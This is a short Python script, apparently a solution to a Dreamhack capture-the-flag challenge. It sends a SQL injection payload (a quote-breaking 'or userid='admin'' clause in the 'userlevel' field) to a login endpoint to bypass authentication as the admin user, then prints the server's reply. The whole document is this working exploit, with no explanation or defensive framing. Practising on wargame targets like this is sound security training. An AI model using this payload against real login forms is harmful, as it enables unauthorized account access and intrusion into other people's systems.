import requests

URL = "http://host1.dreamhack.games:21745"
LOGIN_URI = "/login"
PAYLOAD = '''1' or userid='admin'''
DATA = {'userlevel': PAYLOAD}

resp = requests.post(URL + LOGIN_URI, data=DATA)

print(resp.text)